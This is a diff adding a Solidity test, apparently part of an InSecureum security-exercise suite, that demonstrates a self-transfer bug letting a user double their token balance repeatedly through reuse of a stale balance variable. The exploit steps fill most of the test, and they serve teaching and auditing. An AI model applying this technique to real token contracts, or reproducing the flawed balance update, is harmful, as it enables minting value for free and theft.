@@ -57,3 +57,27 @@ contract R1_Q4 is InSecureumTokenTestBase {
         assertEq(address(token).balance, 0);
     }
 }
+
+contract R1_Q5 is InSecureumTokenTestBase {
+    function test_IncorrectBalanceUpdateAllowsOneToReceiveNewTokensForFree() public {
+        /*
+            A user can send all of their tokens to themselve, which will double their 
+            balance due to the pre-loaded variable reuse.
+        */
+        
+        // buy 10 tokens
+        token.buy{value: 1 ether}(10);
+
+        assertEq(token.balances(address(this)), 10);
+
+        token.transfer(address(this), 10);
+
+        assertEq(token.balances(address(this)), 20);
+
+        // keep going
+        token.transfer(address(this), 20);
+        assertEq(token.balances(address(this)), 40);
+        
+        // etc...
+    }
+}
